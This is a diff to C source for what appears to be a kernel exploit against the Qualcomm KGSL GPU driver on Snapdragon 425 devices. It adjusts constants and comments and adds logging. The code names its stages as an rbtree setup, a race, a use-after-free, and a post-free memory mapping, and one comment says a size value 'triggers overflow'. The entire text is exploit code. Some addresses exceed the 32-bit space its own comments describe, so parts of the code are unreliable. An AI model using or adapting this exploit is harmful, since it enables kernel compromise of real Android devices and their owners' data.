@@ -22,6 +22,7 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/sysmacros.h>
+#include <sched.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -69,13 +70,13 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* 32-bit environment: addresses are within 4GB space */
+/* 32-bit Snapdragon 425 address space */
 #define UAF_ADDR  0x70000000ULL
 #define UAF_SIZE  0x2000000ULL          /* 32MB */
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffff0000ULL        /* ~4GB-64KB, within 32bit max */
+#define BOGUS_SIZE 0xffff0000ULL        /* ~4GB-64KB, triggers overflow */
 #define PLACEHOLDER_ADDR 0x72000000ULL
 #define PLACEHOLDER_SIZE 0x2000000ULL   /* 32MB */
 
@@ -332,7 +333,8 @@ int main(int argc, char **argv) {
     printf("[*] Phase 1: rbtree setup\n");
     phase1_rbtree();
 
-    printf("[*] Phase 2: race\n");
+    printf("[*] Phase 2: race (BOGUS_SIZE=0x%lx, BOGUS_ADDR=0x%lx)\n",
+           (unsigned long)BOGUS_SIZE, (unsigned long)BOGUS_ADDR);
     if (!phase2_race()) { close(kgsl_fd); return 1; }
 
     printf("[*] Phase 3: free UAF\n");
@@ -347,8 +349,7 @@ int main(int argc, char **argv) {
     unsigned int ctx_id = create_context();
     printf("[GPU] context=%u\n", ctx_id);
 
-    /* No need for IB/dst objects, we use CPU scanning */
-
+    /* No need for GPU command buffers; we use CPU mapping after free */
     void *uaf_base = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
     if (uaf_base == MAP_FAILED) die("mmap UAF (post-free)");
